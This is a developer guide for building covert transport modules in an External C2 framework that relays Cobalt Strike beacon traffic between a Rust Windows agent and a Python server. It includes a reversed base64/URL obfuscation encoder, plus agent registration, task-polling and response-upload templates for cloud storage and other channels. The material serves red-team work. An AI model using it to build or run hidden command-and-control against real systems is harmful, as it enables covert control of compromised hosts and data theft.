# Transport Development Workflow

A step-by-step guide for building a new transport module for the External C2 framework. A transport is the covert channel that shuttles data between the **Rust client** (agent) and the **Python server** (C2 relay). The reference implementations use S3 and Azure Blob; this workbook shows you how to create your own (e.g., DNS, HTTP, WebSocket, etc.).

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Data Flow](#2-data-flow)
3. [Encoding Layer (utils.rs)](#3-encoding-layer-utilsrs)
4. [Client-Side Transport (Rust)](#4-client-side-transport-rust)
5. [Server-Side Transport (Python)](#5-server-side-transport-python)
6. [Registration & Feature Flags](#6-registration--feature-flags)
7. [Checklist](#7-checklist)
8. [Reference: S3 & Azure Blob Transport API](#8-reference-s3--azure-blob-transport-api)

---

## 1. Architecture Overview

```
┌──────────────────┐                          ┌──────────────────┐                    ┌────────────────┐
│   Rust Client    │  ◄── Your Transport ──►  │  Python Server   │  ◄── TCP/2222 ──►  │ Cobalt Strike  │
│   (Windows)      │      (covert channel)    │  (C2 relay)      │                    │ External C2    │
└──────────────────┘                          └──────────────────┘                    └────────────────┘
```

### Client Internal Layering

```
main.rs
  │  calls utils::register_beacon / send_data / recv_data
  │
  ▼
utils.rs                    ← ENCODING LAYER (single point of change)
  │  data_encode() before send
  │  data_decode() after recv
  │  calls transports::register_beacon / send_data / recv_data
  │
  ▼
transports/                 ← RAW I/O LAYER (no encoding knowledge)
  ├── transport_s3.rs       ← sends/receives raw bytes via S3
  └── transport_blob.rs     ← sends/receives raw bytes via Azure Blob
```

**Key design principle:** Transports handle **raw bytes only**. All encoding/decoding is done in `utils.rs`. This means:
- To swap the encoder (e.g., from b64url to AES), you only change `data_encode`/`data_decode` in `utils.rs`.
- New transports only need to implement raw byte I/O — no encoding logic needed.

---

## 2. Data Flow

### Agent Registration
```
Client                          Transport Channel                    Server
  │                                                                    │
  │  utils::register_beacon(id)                                        │
  │    └─► transports::register_beacon(id)                             │
  │          └─► write marker "AGENT:{id}" ────►                       │
  │                                        ◄── fetchNewBeacons() ──────│
  │                                            reads "AGENT:{id}"      │
  │                                            deletes marker          │
  │                                            returns [id]            │
```

### Sending Data (Client → Server)
```
Client                          Transport Channel                    Server
  │                                                                    │
  │  utils::send_data(transport, raw_bytes)                            │
  │    ├─► data_encode(raw_bytes) → encoded_bytes                      │
  │    └─► transports::send_data(transport, encoded_bytes)             │
  │          └─► write "{id}:RespForYou:{uuid}" ────►                  │
  │                                        ◄── retrieveData(id) ───────│
  │                                            reads response blobs    │
  │                                            returns encoded data    │
  │                                            (server decodes via     │
  │                                             commonUtils.decoder)   │
```

### Receiving Data (Server → Client)
```
Server                          Transport Channel                    Client
  │                                                                    │
  │  commonUtils.sendData(task, id)                                    │
  │    ├─► encoder.encode(task) → encoded_task                         │
  │    └─► transport.sendData(encoded_task, id)                        │
  │          └─► write "{id}:TaskForYou:{uuid}" ────►                  │
  │                                        ◄── utils::recv_data() ─────│
  │                                            transports::recv_data() │
  │                                            returns raw encoded     │
  │                                            data_decode() each msg  │
  │                                            returns decoded tasks   │
```

---

## 3. Encoding Layer (utils.rs)

All encoding/decoding is centralized in `utils.rs`. Transports never touch encoding.

**Default encoder: `b64url`**

| Step | Encode (before send) | Decode (after receive) |
|------|---------------------|----------------------|
| 1 | `base64_encode(raw_bytes)` | `reverse(encoded_string)` |
| 2 | `url_encode(base64_string)` | `url_decode(reversed_string)` |
| 3 | `reverse(url_encoded_string)` | `base64_decode(url_decoded_string)` |

**Client (Rust) — `utils.rs`:**
```rust
// ── Encoding / Decoding ─────────────────────────────────────────
// Change these two functions to swap the encoder globally.

pub fn data_encode(data: &[u8]) -> String {
    let b64 = general_purpose::STANDARD.encode(data);
    let quoted = urlencoding::encode(&b64).into_owned();
    quoted.chars().rev().collect()
}

pub fn data_decode(data: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let reversed: String = data.chars().rev().collect();
    let unquoted = urlencoding::decode(&reversed)?;
    let bytes = general_purpose::STANDARD.decode(unquoted.as_bytes())?;
    Ok(bytes)
}
```

**Server (Python) — `encoder_b64url.py`:**
```python
def encode(data):
    data = base64.b64encode(data)
    return quote_plus(data)[::-1]

def decode(data):
    data = unquote(data[::-1])
    return base64.b64decode(data)
```

### Transport Wrapper Functions in utils.rs

These wrappers sit between `main.rs` and the transport layer:

```rust
/// Register — pass-through (no encoding needed for registration)
pub async fn register_beacon(beacon_id: &str) -> Result<transports::Transport, _> {
    transports::register_beacon(beacon_id).await
}

/// Send — encode first, then send raw encoded bytes
pub async fn send_data(transport: &transports::Transport, data: &[u8]) -> Result<(), _> {
    let encoded = data_encode(data);
    transports::send_data(transport, encoded.as_bytes()).await
}

/// Receive — get raw encoded bytes, then decode each message
pub async fn recv_data(transport: &transports::Transport) -> Result<Vec<Vec<u8>>, _> {
    let raw_messages = transports::recv_data(transport).await?;
    let mut decoded = Vec::new();
    for raw in raw_messages {
        let raw_str = std::str::from_utf8(&raw)?;
        decoded.push(data_decode(raw_str)?);
    }
    Ok(decoded)
}
```

> **To add a new encoder:** Only modify `data_encode` and `data_decode` in `utils.rs` (client) and the corresponding encoder module in `server/utils/encoders/` (server). No transport code changes needed.

---

## 4. Client-Side Transport (Rust)

### File Location

```
client/src/transports/transport_<name>.rs
```

### Required Exports

Your transport module **must** export exactly these three items:

| Export | Type | Description |
|--------|------|-------------|
| `struct <Name>Transport` | `pub struct` | Opaque handle holding connection state. |
| `register_beacon()` | `pub async fn` | Registers the agent and returns the transport handle. |
| `send_data()` | `pub async fn` | Sends **raw bytes** (already encoded by utils.rs). |
| `recv_data()` | `pub async fn` | Receives **raw bytes** (will be decoded by utils.rs). |

### Function Signatures

```rust
// NOTE: No encoding imports needed! Transports deal with raw bytes only.

/// Opaque transport handle — holds your connection/client state.
pub struct <Name>Transport {
    // Your internal fields (client handle, key prefixes, etc.)
}

/// Register a new beacon with the C2 server.
///
/// Must:
///   1. Initialize your transport client/connection
///   2. Write a registration marker so the server can discover this agent
///   3. Return a transport handle for subsequent send/recv calls
pub async fn register_beacon(beacon_id: &str) -> Result<<Name>Transport, Box<dyn std::error::Error>> {
    todo!()
}

/// Send raw bytes to the C2 server.
///
/// The data has ALREADY been encoded by utils::send_data().
/// Just write it to the transport channel as-is.
pub async fn send_data(transport: &<Name>Transport, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    todo!()
}

/// Receive raw bytes from the C2 server.
///
/// Return the raw bytes as-is — utils::recv_data() will decode them.
/// Must poll until data is available.
pub async fn recv_data(transport: &<Name>Transport) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    todo!()
}
```

### Key Naming Convention

The client and server must agree on key/identifier patterns:

| Pattern | Direction | Purpose |
|---------|-----------|---------|
| `AGENT:{beacon_id}` | Client → Server | Registration marker |
| `{beacon_id}:TaskForYou:{uuid}` | Server → Client | Task delivery |
| `{beacon_id}:RespForYou:{uuid}` | Client → Server | Response delivery |

### Template

```rust
//! <Name>-based transport layer for the External C2 client.
//!
//! Handles raw I/O only — no encoding/decoding.
//! Encoding is handled by the wrapper functions in `utils.rs`.

use std::time::Duration;
use tokio::time::sleep;
use uuid::Uuid;

// NOTE: No `use crate::utils::{data_encode, data_decode};` needed!

// ── Configuration ───────────────────────────────────────────────────────
const MY_ENDPOINT: &str = "https://...";
const MY_API_KEY: &str = "...";

// ── Internal client ─────────────────────────────────────────────────────
struct MyClient {
    // Your internal client fields
}

impl MyClient {
    fn new() -> Result<Self, Box<dyn std::error::Error>> { todo!() }
    async fn write(&self, key: &str, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> { todo!() }
    async fn read(&self, key: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> { todo!() }
    async fn list(&self, prefix: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> { todo!() }
    async fn delete(&self, key: &str) -> Result<(), Box<dyn std::error::Error>> { todo!() }
}

// ── Transport handle ────────────────────────────────────────────────────
pub struct MyTransport {
    client: MyClient,
    task_key_name: String,
    resp_key_name: String,
}

// ── Public API (raw I/O — no encoding) ──────────────────────────────────

pub async fn register_beacon(beacon_id: &str) -> Result<MyTransport, Box<dyn std::error::Error>> {
    let client = MyClient::new()?;
    let reg_key = format!("AGENT:{beacon_id}");
    client.write(&reg_key, b"").await?;
    println!("[+] transport: Registered agent {}", reg_key);

    Ok(MyTransport {
        client,
        task_key_name: format!("{beacon_id}:TaskForYou"),
        resp_key_name: format!("{beacon_id}:RespForYou"),
    })
}

pub async fn send_data(transport: &MyTransport, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let key = format!("{}:{}", transport.resp_key_name, Uuid::new_v4());
    // data is already encoded — just write it as-is
    transport.client.write(&key, data).await?;
    Ok(())
}

pub async fn recv_data(transport: &MyTransport) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    loop {
        let keys = transport.client.list(&transport.task_key_name).await?;
        if keys.is_empty() {
            sleep(Duration::from_secs(10)).await;
            continue;
        }

        let mut tasks = Vec::new();
        for key in keys {
            // Return raw bytes — utils.rs will decode them
            let raw = transport.client.read(&key).await?;
            transport.client.delete(&key).await?;
            tasks.push(raw);
        }
        return Ok(tasks);
    }
}
```

---

## 5. Server-Side Transport (Python)

### File Location

```
server/utils/transports/transport_<name>.py
```

### Required Functions

Your Python transport module **must** export exactly these four functions:

| Function | Description |
|----------|-------------|
| `prepTransport()` | Initialize the transport client. Called once at startup. Return `0` on success. |
| `sendData(data, beaconId)` | Send encoded task data to the client. Data is already encoded by `commonUtils.sendData()`. |
| `retrieveData(beaconId)` | Retrieve encoded response data from the client. Returns raw encoded messages — `commonUtils.retrieveData()` will decode them. |
| `fetchNewBeacons()` | Discover newly registered agents. Returns a `list` of beacon ID strings. Must clean up registration markers. |

### Template

```python
"""
<Name>-based transport for the External C2 server.
"""
from time import sleep
import uuid

# ── Configuration ────────────────────────────────────────────────────
MY_ENDPOINT = "https://..."
MY_API_KEY = "..."

client = None
taskKeyName = "TaskForYou"
respKeyName = "RespForYou"

def prepTransport():
    global client
    # Initialize your transport client
    return 0

def sendData(data, beaconId):
    # data is already encoded by commonUtils — just write it
    keyName = "{}:{}:{}".format(beaconId, taskKeyName, str(uuid.uuid4()))
    # client.write(keyName, data)

def retrieveData(beaconId):
    # Return raw encoded data — commonUtils will decode it
    keyName = "{}:{}".format(beaconId, respKeyName)
    while True:
        try:
            objects = []  # client.list(prefix=keyName)
            if objects:
                responses = []
                for obj in objects:
                    msg = b""  # client.read(obj.key)
                    # client.delete(obj.key)
                    responses.append(msg)
                return responses
        except Exception:
            pass
        sleep(5)

def fetchNewBeacons():
    try:
        objects = []  # client.list_all()
        beacons = []
        for obj in objects:
            if "AGENT:" in obj:
                beaconId = obj.split(":")[1]
                print("[+] Discovered new Agent: {}".format(beaconId))
                # client.delete(obj)
                beacons.append(beaconId)
        return beacons
    except Exception:
        return []
```

---

## 6. Registration & Feature Flags

### Client Side

**Step 1:** Add a feature flag in `client/Cargo.toml`:

```toml
[features]
default = ["stagless", "transport_<name>"]
transport_<name> = []
```

**Step 2:** Register the module in `client/src/transports/mod.rs`:

```rust
#[cfg(feature = "transport_<name>")]
mod transport_<name>;

#[cfg(feature = "transport_<name>")]
pub use transport_<name>::*;

#[cfg(feature = "transport_<name>")]
pub type Transport = transport_<name>::<Name>Transport;
```

**Step 3:** Add any required dependencies to `client/Cargo.toml`.

### Server Side

**Step 1:** Place your file at `server/utils/transports/transport_<name>.py`

**Step 2:** Update `server/config.py`:

```python
TRANSPORT_MODULE = "transport_<name>"
```

No other registration is needed — the server dynamically imports the transport module.

---

## 7. Checklist

Use this checklist when building a new transport:

### Planning
- [ ] Choose your covert channel (cloud storage, DNS, HTTP, WebSocket, etc.)
- [ ] Ensure it supports: write, read, list-by-prefix, delete operations
- [ ] Verify both client (Windows/Rust) and server (Python) can access it

### Client (Rust) — Raw I/O Only
- [ ] Create `client/src/transports/transport_<name>.rs`
- [ ] Implement `pub struct <Name>Transport` with internal state
- [ ] Implement `pub async fn register_beacon()` → writes `AGENT:{id}` marker
- [ ] Implement `pub async fn send_data()` → writes raw bytes to `{id}:RespForYou:{uuid}`
- [ ] Implement `pub async fn recv_data()` → polls `{id}:TaskForYou`, returns raw bytes, deletes after read
- [ ] **Do NOT** import or call `data_encode`/`data_decode` — that's handled by `utils.rs`
- [ ] Add feature flag `transport_<name>` to `Cargo.toml`
- [ ] Add `Transport` type alias in `transports/mod.rs`
- [ ] Add transport crate dependencies to `Cargo.toml`

### Server (Python)
- [ ] Create `server/utils/transports/transport_<name>.py`
- [ ] Implement `prepTransport()` → initialize client, return 0
- [ ] Implement `sendData(data, beaconId)` → write to `{id}:TaskForYou:{uuid}`
- [ ] Implement `retrieveData(beaconId)` → poll `{id}:RespForYou`, return list of raw messages
- [ ] Implement `fetchNewBeacons()` → find `AGENT:*` markers, delete them, return IDs

### Integration
- [ ] Set `TRANSPORT_MODULE = "transport_<name>"` in `server/config.py`
- [ ] Set `default = ["stagless", "transport_<name>"]` in `client/Cargo.toml`
- [ ] Build client: `cargo build --release`
- [ ] Test registration: agent appears in server logs
- [ ] Test stager delivery (stager mode)
- [ ] Test interact loop: tasks flow server→client, responses flow client→server

---

## 8. Reference: S3 & Azure Blob Transport API

### S3 Transport

| Operation | S3 API Call | Key Pattern |
|-----------|-------------|-------------|
| Register | `put_object(key, b"")` | `AGENT:{beacon_id}` |
| Send data | `put_object(key, raw_bytes)` | `{beacon_id}:RespForYou:{uuid}` |
| Recv data (list) | `list_objects(prefix)` | `{beacon_id}:TaskForYou` |
| Recv data (read) | `get_object(key)` | `{beacon_id}:TaskForYou:{uuid}` |
| Recv data (cleanup) | `delete_object(key)` | `{beacon_id}:TaskForYou:{uuid}` |
| Fetch beacons | `list_objects()` + filter `AGENT:` | `AGENT:*` |

### Azure Blob Transport

| Operation | Azure Blob API Call | Key Pattern |
|-----------|---------------------|-------------|
| Register | `put_blob(key, b"")` | `AGENT:{beacon_id}` |
| Send data | `put_blob(key, raw_bytes)` | `{beacon_id}:RespForYou:{uuid}` |
| Recv data (list) | `list_blobs(prefix)` | `{beacon_id}:TaskForYou` |
| Recv data (read) | `get_blob(key)` | `{beacon_id}:TaskForYou:{uuid}` |
| Recv data (cleanup) | `delete_blob(key)` | `{beacon_id}:TaskForYou:{uuid}` |
| Fetch beacons | `list_blobs("AGENT:")` | `AGENT:*` |

> **Note:** In both cases, the transport sends/receives **raw bytes** (already encoded or still encoded). The encoding/decoding is handled by `utils.rs` (client) and `commonUtils.py` (server), not by the transport itself.
